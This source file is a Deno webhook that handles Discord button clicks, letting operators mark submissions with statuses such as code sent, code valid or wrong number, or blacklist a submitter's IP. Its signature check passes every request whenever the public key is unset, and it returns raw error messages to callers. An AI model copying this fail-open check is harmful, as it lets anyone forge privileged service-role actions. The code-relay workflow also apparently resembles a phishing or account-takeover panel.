import { createClient } from 'npm:@base44/sdk@0.8.31';

const BOT_TOKEN = Deno.env.get("DISCORD_BOT_TOKEN");
const PUBLIC_KEY = Deno.env.get("DISCORD_PUBLIC_KEY");

async function verifySignature(req, body) {
  if (!PUBLIC_KEY) return true; // skip if not set
  const signature = req.headers.get("x-signature-ed25519");
  const timestamp = req.headers.get("x-signature-timestamp");
  if (!signature || !timestamp) return false;

  const key = await crypto.subtle.importKey(
    "raw",
    hexToUint8Array(PUBLIC_KEY),
    { name: "Ed25519" },
    false,
    ["verify"]
  );
  const encoder = new TextEncoder();
  return crypto.subtle.verify(
    "Ed25519",
    key,
    hexToUint8Array(signature),
    encoder.encode(timestamp + body)
  );
}

function hexToUint8Array(hex) {
  return new Uint8Array(hex.match(/.{1,2}/g).map(b => parseInt(b, 16)));
}

Deno.serve(async (req) => {
  try {
    const rawBody = await req.text();

    const valid = await verifySignature(req, rawBody);
    if (!valid) return new Response("invalid request signature", { status: 401 });

    const interaction = JSON.parse(rawBody);

    // Discord PING
    if (interaction.type === 1) {
      return Response.json({ type: 1 });
    }

    // Button click (type 3 = MESSAGE_COMPONENT)
    if (interaction.type === 3) {
      const customId = interaction.data?.custom_id || "";
      const parts = customId.split(":");
      // format: action:<actionType>:<submissionId>[:<ip>]
      const actionType = parts[1];
      const submissionId = parts[2];
      const ipAddr = parts[3] || null;

      const base44 = createClient({
        appId: Deno.env.get("BASE44_APP_ID"),
        serviceRoleKey: Deno.env.get("BASE44_SERVICE_ROLE_KEY"),
      });

      const statusMap = {
        code_ready: "code_ready",
        valid: "code_valid",
        wrong: "code_wrong",
        expired: "code_expired",
        wait: "waiting_queue",
      };

      if (actionType === "blacklist" && ipAddr) {
        // Blacklist the IP
        await base44.asServiceRole.entities.BlacklistEntry.create({ value: ipAddr, type: "ip" });
        await base44.asServiceRole.entities.Submission.update(submissionId, { status: "code_wrong" });
      } else if (statusMap[actionType]) {
        await base44.asServiceRole.entities.Submission.update(submissionId, { status: statusMap[actionType] });
      }

      const actionLabels = {
        code_ready: "Code envoyé ✅",
        valid: "Code validé ✅",
        wrong: "Mauvais numéro ❌",
        expired: "Renvoyé au code ⏰",
        wait: "Mis en attente ⏳",
        blacklist: "IP blacklistée 🚫",
      };

      const label = actionLabels[actionType] || "Action effectuée";

      // Ephemeral response — only the clicking user sees it
      return Response.json({
        type: 4,
        data: {
          content: `✅ **Opération réussie** — ${label}`,
          flags: 64, // EPHEMERAL
        }
      });
    }

    return Response.json({ type: 1 });
  } catch (error) {
    return Response.json({ error: error.message }, { status: 500 });
  }
});